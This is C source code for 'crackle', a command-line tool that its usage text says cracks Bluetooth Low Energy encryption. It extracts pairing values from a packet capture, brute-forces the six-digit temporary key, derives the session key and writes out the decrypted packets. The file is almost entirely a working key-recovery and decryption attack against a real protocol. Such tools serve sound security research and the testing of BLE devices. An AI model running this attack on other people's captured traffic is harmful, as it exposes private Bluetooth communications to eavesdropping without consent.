#include <assert.h>
#include <err.h>
#include <getopt.h>
#include <stdint.h>
#include <string.h>

#include "aes.h"
#include "crackle.h"

#define PFH_BTLE (30006)

// CACE PPI headers
typedef struct ppi_packetheader {
    uint8_t pph_version;
    uint8_t pph_flags;
    uint16_t pph_len;
    uint32_t pph_dlt;
} __attribute__((packed)) ppi_packet_header_t;

typedef struct ppi_fieldheader {
    u_int16_t pfh_type;       /* Type */
    u_int16_t pfh_datalen;    /* Length of data */
} ppi_fieldheader_t;

typedef struct ppi_btle {
    uint8_t btle_version; // 0 for now
    uint16_t btle_channel;
    uint8_t btle_clkn_high;
    uint32_t btle_clk100ns;
    int8_t rssi_max;
    int8_t rssi_min;
    int8_t rssi_avg;
    uint8_t rssi_count;
} __attribute__((packed)) ppi_btle_t;


/* misc definitions */
void run_tests(void);


uint8_t read_8(const u_char *bytes) {
    return *bytes;
}

uint16_t read_16(const u_char *bytes) {
    uint16_t r = *(uint16_t *)bytes;
    return le16toh(r);
}

uint32_t read_32(const u_char *bytes) {
    uint32_t r = *(uint32_t *)bytes;
    return le32toh(r);
}

void read_48(const u_char *bytes, uint8_t *dest) {
    int i;
    for (i = 0; i < 6; ++i)
        dest[i] = bytes[5-i];
}

void print_48(uint8_t *val) {
    int i;
    for (i = 0; i < 5; ++i)
        printf("%02x:", val[i]);
    printf("%02x\n", val[5]);
}

void copy_reverse(const u_char *bytes, uint8_t *dest, size_t len) {
    unsigned i;
    for (i = 0; i < len; ++i)
        dest[i] = bytes[len - 1 - i];
}

static void enc_data_extractor(crackle_state_t *state,
                               const struct pcap_pkthdr *h,
                               const u_char *bytes,
                               off_t offset,
                               size_t len) {
    const uint32_t adv_aa = 0x8e89bed6;
    uint32_t aa;

    assert(state != NULL);

    bytes += offset;
    len -= offset;

    aa = read_32(bytes);

    if (aa == adv_aa) {
        uint8_t flags = read_8(bytes + 4);

        // connect packet, grab those addresses!
        if ((flags % 0xf) == 5) {
            if (state->connect_found)
                printf("Warning: found multiple connects, only using the latest one\n");
            state->connect_found = 1;

            read_48(bytes + 6, state->ia);
            read_48(bytes + 12, state->ra);
            state->iat = (flags & 0x40) ? 1 : 0;
            state->rat = (flags & 0x80) ? 1 : 0;
        }
    }

    // data packet
    else {
        uint8_t flags = read_8(bytes + 4);
        if ((flags & 0x3) == 2) {
            uint16_t l2len = read_16(bytes + 6);
            uint16_t cid = read_16(bytes + 8);

            // Bluetooth Security Manager
            if (cid == 6) {
                uint8_t command = read_8(bytes + 10);

                // pairing request, copy it
                if (command == 0x1) {
                    if (state->preq_found)
                        printf("Warning: found multiple pairing requests, only using the latest one\n");
                    if (l2len != 7) {
                        printf("Warning: pairing request is wrong length (%u), skipping\n", l2len);
                        return;
                    }
                    copy_reverse(bytes + 10, state->preq, 7);
                    state->preq_found = 1;
                }

                // pairing response, copy it
                else if (command == 0x2) {
                    if (state->pres_found)
                        printf("Warning: found multiple pairing responses, only using the latest one\n");
                    if (l2len != 7) {
                        printf("Warning: pairing response is wrong length (%u), skipping\n", l2len);
                        return;
                    }
                    copy_reverse(bytes + 10, state->pres, 7);
                    state->pres_found = 1;
                }

                // pairing confirm, copy the confirm value
                else if (command == 0x3) {
                    if (l2len != 17) {
                        printf("Warning: confirm is wrong length (%u), skipping\n", l2len);
                        return;
                    }
                    if (state->confirm_found >= 2) {
                        printf("Warning: already saw two confirm values, skipping\n");
                        return;
                    }
                    uint8_t *dest = state->confirm_found == 0 ? state->mconfirm : state->sconfirm;
                    copy_reverse(bytes + 11, dest, 16);
                    ++state->confirm_found;
                }

                // pairing random, copy the random value
                else if (command == 0x4) {
                    if (l2len != 17) {
                        printf("Warning: random is wrong length (%u), skipping\n", l2len);
                        return;
                    }
                    if (state->random_found >= 2) {
                        printf("Warning: already saw two random values, skipping\n");
                        return;
                    }
                    uint8_t *dest = state->random_found == 0 ? state->mrand : state->srand;
                    copy_reverse(bytes + 11, dest, 16);
                    ++state->random_found;
                }
            }
        }

        // LL Control PDU
        else if ((flags & 3) == 3) {
            uint8_t len = read_8(bytes + 5);
            uint8_t opcode = read_8(bytes + 6);

            // LL_ENC_REQ
            if (opcode == 0x3) {
                if (state->enc_req_found)
                    printf("Warning: found multiple LL_ENC_REQ, only using latest one\n");
                if (len != 23) {
                    printf("Warning: LL_ENC_REQ is wrong length (%u), skipping\n", len);
                    return;
                }
                copy_reverse(bytes +  7, state->rand, 8);
                copy_reverse(bytes + 15, state->ediv, 2);
                copy_reverse(bytes + 17, state->skdm, 8);
                copy_reverse(bytes + 25, state->ivm,  4);
                state->enc_req_found = 1;
            }

            // LL_ENC_RSP
            else if (opcode == 0x4) {
                if (state->enc_rsp_found)
                    printf("Warning: found multiple LL_ENC_RSP, only using latest one\n");
                if (len != 13) {
                    printf("Warning: LL_ENC_RSP is wrong length (%u), skipping\n", len);
                    return;
                }
                copy_reverse(bytes +  7, state->skds, 8);
                copy_reverse(bytes + 15, state->ivs,  4);
                state->enc_rsp_found = 1;
            }
        }
    }
}

static void packet_decrypter(crackle_state_t *state,
                             const struct pcap_pkthdr *h,
                             const u_char *bytes_in,
                             off_t offset,
                             size_t len_in) {
    const uint32_t adv_aa = 0x8e89bed6;
    uint32_t aa;
    uint8_t *bytes, *btle_bytes;
    struct pcap_pkthdr wh = *h; // copy from input

    assert(state != NULL);

    bytes = malloc(len_in);
    memcpy(bytes, bytes_in, len_in);
    btle_bytes = bytes + offset;

    aa = read_32(bytes);

    if (aa == adv_aa)
        return;

    uint8_t flags = read_8(btle_bytes + 4);

    if (state->decryption_active) {
        uint8_t len = read_8(btle_bytes + 5);

        // non-empty PDU: decrypt before dumping
        if (len > 0) {
            int r, i, j;
            uint8_t out[64];
            uint8_t adata[16] = { flags & 0xf3, 0x00, };
            uint8_t nonce[16];
            const uint8_t *mic;

            if (len < 5) {
                printf("Warning: packet is too short to be encrypted (%u), skipping\n", len);
                return;
            }

            len -= 4;
            mic = btle_bytes + 6 + len;

            for (i = 0; i < 100; ++i) {
                for (j = 0; j < 2; ++j) {
                    uint64_t counter = state->packet_counter[j] + i;
                    uint64_t counter_le = htole64(counter);

                    memcpy(nonce, &counter_le, 5);      // 39 bit counter
                    nonce[4] |= j == 0 ? 0x80 : 0x00;   // direction bit: set for master -> slave
                    memcpy(nonce + 5, state->iv, 8);

                    r = aes_ccm_ad(state->session_key, 16, nonce, 4,
                                   btle_bytes + 6, len, adata, 1,
                                   mic, out);
                    if (r == 0) {
                        // copy length
                        btle_bytes[5] = len;

                        // copy data
                        memcpy(btle_bytes + 6, out, len);
                        memcpy(bytes + offset, btle_bytes, len_in - 4);

                        // shorten length in pcap header (no more mic)
                        wh.caplen -= 4;
                        wh.len -= 4;

                        ++state->total_decrypted;
                        state->packet_counter[j] = counter + 1;

                        goto done;
                    }
                }
            }

            // give up
            printf("Warning: could not decrypt packet! Copying as is..\n");
            free(bytes);
            return;
        }
    }
    else {
        // LL Control PDU
        if ((flags & 3) == 3) {
            uint8_t opcode = read_8(btle_bytes + 6);
            if (opcode == 0x4) // LL_ENC_RSP
                state->decryption_active = 1;
        }
    }

done:
    ++state->total_processed;
    pcap_dump((unsigned char *)state->dumper, &wh, bytes);

    free(bytes);
}


void packet_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
    crackle_state_t *state;
    size_t header_len;
    ppi_packet_header_t *ppih;
    ppi_fieldheader_t *ppifh;
    ppi_btle_t *ppib;

    assert(user != NULL);
    state = (crackle_state_t *)user;

    // sanity checks below!
    header_len = sizeof(*ppih) + sizeof(*ppifh) + sizeof(*ppib);
    if (h->caplen < header_len) {
        printf("Warning: short packet, skipping\n");
        return;
    }

    ppih  = (ppi_packet_header_t *)bytes;
    if (ppih->pph_dlt != DLT_USER0) {
        printf("Warning: unknown packet type encountered, skipping\n");
        return;
    }

    ppifh = (ppi_fieldheader_t *)(bytes + sizeof(*ppih));
    if (ppifh->pfh_type != PFH_BTLE) {
        printf("Warning: BTLE DLT found, but it doesn't have a BTLE header\n");
        return;
    }
    if (ppifh->pfh_datalen != sizeof(*ppib)) {
        printf("Warning: BTLE DLT with BTLE header, but header length is wrong\n");
        return;
    }

    ppib  = (ppi_btle_t *)(bytes + sizeof(*ppih) + sizeof(*ppifh));

    // whew, now that we've got all that out of the way onto the parsing
    state->btle_handler(state, h, bytes, header_len, h->caplen);
}

/*
 * Do AES on the 16 byte block of data.
 */
void aes_block(uint8_t *key, uint8_t *data, uint8_t *out) {
    void *aes_ctx = aes_encrypt_init(key, 16);
    aes_encrypt(aes_ctx, data, out);
    aes_encrypt_deinit(aes_ctx);
}

/*
 * Calculate the confirm according to the core spec.
 *
 *  master: true if you want to calculate the master's confirm, false for slave's
 *  numeric_key: value between 0 and 999,999 (use 0 for Just Works)
 *  out: 16 byte buffer for storing the output
 */
void calc_confirm(crackle_state_t *state, int master, uint32_t numeric_key, uint8_t *out) {
    int i;
    uint8_t p1[16] = { 0, };
    uint8_t p2[16] = { 0, };
    uint8_t key[16] = { 0, };
    uint8_t *rand = master ? state->mrand : state->srand;

    numeric_key = htobe32(numeric_key);
    memcpy(&key[12], &numeric_key, 4);

    // p1 = pres || preq || rat || iat
    memcpy(p1 +  0, state->pres, 7);
    memcpy(p1 +  7, state->preq, 7);
    p1[14] = state->rat;
    p1[15] = state->iat;

    // p2 = padding || ia || ra
    memcpy(p2 +  4, state->ia, 6);
    memcpy(p2 + 10, state->ra, 6);

    for (i = 0; i < 16; ++i)
        p1[i] ^= rand[i];

    aes_block(key, p1, out);

    for (i = 0; i < 16; ++i)
        p1[i] = out[i] ^ p2[i];

    aes_block(key, p1, out);
}

void calc_stk(crackle_state_t *state, uint32_t numeric_key) {
    uint8_t rand[16];

    assert(state != NULL);

    // calculate TK
    numeric_key = htobe32(numeric_key);
    memcpy(&state->tk[12], &numeric_key, 4);

    // STK = s1(TK, Srand, Mrand) [pg 1971]
    // concatenate the lower 8 octets of Srand and MRand
    memcpy(rand + 0, state->srand + 8, 8);
    memcpy(rand + 8, state->mrand + 8, 8);

    aes_block(state->tk, rand, state->stk);
}

void calc_session_key(crackle_state_t *state) {
    uint8_t skd[16];

    assert(state != NULL);

    // SKD = SKDm || SKDs [pg 2247]
    memcpy(skd + 0, state->skds, 8);
    memcpy(skd + 8, state->skdm, 8);

    // sesion key = e(STK, SKD)
    aes_block(state->stk, skd, state->session_key);
}

void calc_iv(crackle_state_t *state) {
    assert(state != NULL);

    copy_reverse(state->ivm, state->iv + 0, 4);
    copy_reverse(state->ivs, state->iv + 4, 4);
}

void dump_blob(uint8_t *data, size_t len) {
    unsigned i;
    for (i = 0; i < len; ++i) printf(" %02x", data[i]);
    printf("\n");
}

void dump_state(crackle_state_t *state) {
    int i;

    assert(state != NULL);

    printf("connect_found: %d\n", state->connect_found);
    printf("preq_found: %d\n", state->preq_found);
    printf("pres_found: %d\n", state->pres_found);
    printf("confirm_found: %d\n", state->confirm_found);
    printf("random_found: %d\n", state->random_found);
    printf("enc_req_found: %d\n", state->enc_req_found);
    printf("enc_rsp_found: %d\n", state->enc_rsp_found);

    if (state->connect_found) {
        printf("IA: ");
        print_48(state->ia);
        printf("RA: ");
        print_48(state->ra);
        printf("IAt: %d\n", state->iat);
        printf("RAt: %d\n", state->rat);
    }

    if (state->preq_found) {
        printf("PREQ:");
        dump_blob(state->preq, 7);
    }

    if (state->pres_found) {
        printf("PRES:");
        dump_blob(state->pres, 7);
    }

    for (i = 0; i < state->confirm_found; ++i) {
        printf("%cCONFIRM:", i == 0 ? 'M' : 'S');
        dump_blob(i == 0 ? state->mconfirm : state->sconfirm, 16);
    }

    for (i = 0; i < state->random_found; ++i) {
        printf("%cRAND:", i == 0 ? 'M' : 'S');
        dump_blob(i == 0 ? state->mrand : state->srand, 16);
    }

    if (state->enc_req_found) {
        printf("Rand:");
        dump_blob(state->rand, 8);
        printf("EDIV:");
        dump_blob(state->ediv, 2);
        printf("SKDm:");
        dump_blob(state->skdm, 8);
        printf("IVm: ");
        dump_blob(state->ivm, 4);
    }

    if (state->enc_rsp_found) {
        printf("SKDs:");
        dump_blob(state->skds, 8);
        printf("IVs: ");
        dump_blob(state->ivs, 4);
    }
}

void usage(void) {
    printf("Usage: crackle -i <input.pcap> [-o <output.pcap>] [-v] [-t]\n");
    printf("Cracks Bluetooth Low Energy encryption (AKA Bluetooth Smart)\n");
    printf("\n");
    printf("Optional arguments:\n");
    printf("    -v   Be verbose\n");
    printf("    -t   Run tests against crypto engine\n");
    printf("\n");
    printf("Written by Mike Ryan <mikeryan@lacklustre.net>\n");
    printf("See web site for more info:\n");
    printf("    http://lacklustre.net/projects/cracle/\n");
    exit(1);
}

int main(int argc, char **argv) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *cap;
    crackle_state_t state;
    int err_count = 0;
    uint8_t confirm[16] = { 0, };
    int r;
    uint32_t numeric_key;
    int tk_found = 0;

    // arguments
    int opt;
    int verbose = 0, do_tests = 0;
    char *pcap_file = NULL;
    char *pcap_file_out = NULL;

    while ((opt = getopt(argc, argv, "i:o:vth")) != -1) {
        switch (opt) {
            case 'i':
                pcap_file = strdup(optarg);
                break;

            case 'o':
                pcap_file_out = strdup(optarg);
                break;

            case 'v':
                verbose = 1;
                break;

            case 't':
                do_tests = 1;
                break;

            case 'h':
                usage();
                break;

            case '?':
                usage();
                break;

            default:
                printf("?? getopt wtf 0%o ??\n", opt);
        }
    }

    if (do_tests) {
        run_tests();
        printf("All tests passed\n");
        return 0;
    }

    if (pcap_file == NULL)
        usage();

    if (pcap_file_out == NULL)
        printf("Warning: No output file specified. Won't decrypt any packets.\n");

    // reset state
    memset(&state, 0, sizeof(state));

    state.btle_handler = enc_data_extractor;

    cap = pcap_open_offline(pcap_file, errbuf);
    if (cap == NULL)
        errx(1, "%s", errbuf);
    pcap_dispatch(cap, 0, packet_handler, (u_char *)&state);
    pcap_close(cap);

    // cool, now let's check if we have everything we need
    if (!state.connect_found) {
        printf("No connect packet found\n");
        ++err_count;
    }
    if (!state.preq_found) {
        printf("No pairing request found\n");
        ++err_count;
    }
    if (!state.pres_found) {
        printf("No pairing response found\n");
        ++err_count;
    }
    if (state.confirm_found != 2) {
        printf("Not enough confirm values found (%d, need 2)\n", state.confirm_found);
        ++err_count;
    }
    if (state.random_found != 2) {
        printf("Not enough random values found (%d, need 2)\n", state.random_found);
        ++err_count;
    }
    if (!state.enc_req_found) {
        printf("No LL_ENC_REQ found\n");
        ++err_count;
    }
    if (!state.enc_rsp_found) {
        printf("No LL_ENC_RSP found\n");
        ++err_count;
    }
    if (err_count > 0) {
        printf("Giving up due to %d error%s\n", err_count, err_count == 1 ? "" : "s");
        return 1;
    }

    if (verbose)
        dump_state(&state);

    // brute force the TK, starting with 0 for Just Works
    for (numeric_key = 0; numeric_key < 1000000; ++numeric_key) {
        calc_confirm(&state, 1, numeric_key, confirm);
        r = memcmp(state.mconfirm, confirm, 16);
        if (r == 0) {
            tk_found = 1;
            break;
        }
    }

    if (!tk_found) {
        printf("TK not found, the connection is probably using OOB pairing\n");
        printf("Sorry d00d :(\n");
        return 1;
    }

    printf("TK found: %06d\n", numeric_key);
    if (numeric_key == 0)
        printf("ding ding ding, using a TK of 0! Just Cracks(tm)\n");

    if (pcap_file_out == NULL) {
        printf("Specify an output file with -o to decrypt packets!\n");
        return 0;
    }

    calc_stk(&state, numeric_key);
    calc_session_key(&state);
    calc_iv(&state);

    pcap_t *pcap_dumpfile = pcap_open_dead(DLT_PPI, 128);
    if (pcap_dumpfile == NULL)
        err(1, "pcap_open_dead: ");
    state.dumper = pcap_dump_open(pcap_dumpfile, pcap_file_out);
    if (state.dumper == NULL) {
        warn("pcap_dump_open");
        pcap_close(pcap_dumpfile);
        return 1;
    }

    state.btle_handler = packet_decrypter;

    cap = pcap_open_offline(pcap_file, errbuf);
    if (cap == NULL)
        errx(1, "%s", errbuf);
    pcap_dispatch(cap, 0, packet_handler, (u_char *)&state);
    pcap_close(cap);

    pcap_dump_flush(state.dumper);
    pcap_close(pcap_dumpfile);

    printf("Done, processed %d total packets, decrypted %d\n", state.total_processed, state.total_decrypted);

    return 0;
}
